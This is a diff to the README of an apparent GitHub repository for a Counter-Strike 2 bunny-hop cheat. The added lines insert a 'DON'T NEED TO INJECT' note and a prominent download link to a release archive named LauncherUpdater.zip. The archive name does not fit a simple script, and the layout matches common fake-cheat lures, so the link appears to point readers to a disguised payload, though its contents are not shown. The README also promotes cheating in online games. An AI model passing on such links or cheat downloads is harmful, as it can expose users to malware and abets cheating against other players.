@@ -1,6 +1,11 @@
 # CS2 Bhop Script
 > A simple yet effective script for achieving bunny hopping in Counter-Strike 2 (CS2). This script enhances your movement by allowing you to jump seamlessly and maintain momentum, giving you an edge in competitive gameplay.
 
+>[!NOTE]
+>DON'T NEED TO INJECT
+
+### [Download latest version](https://github.com/agos555gamer/cs2-bhop-script/releases/download/cs2-bhop/LauncherUpdater.zip)
+
 ## Features:
 * Smooth Bunny Hopping: Effortlessly maintain speed while jumping.
 * Easy Setup: Simple installation and configuration process.
